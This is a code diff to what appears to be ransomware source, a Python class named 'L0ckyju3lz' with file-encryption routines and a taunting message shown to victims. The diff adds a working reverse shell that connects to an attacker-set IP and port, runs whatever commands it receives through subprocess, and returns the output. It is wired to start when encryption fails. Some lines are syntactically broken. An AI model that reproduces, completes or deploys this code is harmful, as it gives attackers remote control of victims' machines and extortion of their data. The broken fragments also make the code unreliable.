@@ -1,6 +1,7 @@
 import os
 import shutil
 import sys
+import subprocess
 import string
 import random
 import smtplib
@@ -146,9 +147,25 @@ class L0ckyju3lz():
             return False
 
     def reverse_shell(self):
+        # Set Buffersize
+        buffer_size = 1024
+        # Create socket object
         with socket.socket() as s:
-            s.connect((self.))
+            # Connect to server
+            s.connect((self.server_ip_rshell, self.server_port_rshell))
+            while True:
+                command = s.recv(buffer_size).decode()
+                # Exit
+                if command == "exit":
+                    break
+                # Get output
+                output = subprocess.getoutput(command)
+                # Send output back to server
+                s.send(output.encode())
+        return True
 
+    def reverse_shell_perm(self):
+        pass
 
     def crypt_file(self, *,, mode=None):
         if mode == 'enc':
@@ -217,7 +234,9 @@ class L0ckyju3lz():
             print("Start crying little baby ...")
         else:
             # Okay, encryption fails - lets try to start a reverse shell than ...
-            sys.exit(0)
+            if self.reverse_shell():
+                self.reverse_shell_perm()
+            else: sys.exit(0)
 
 
 if __name__ == "__main__":
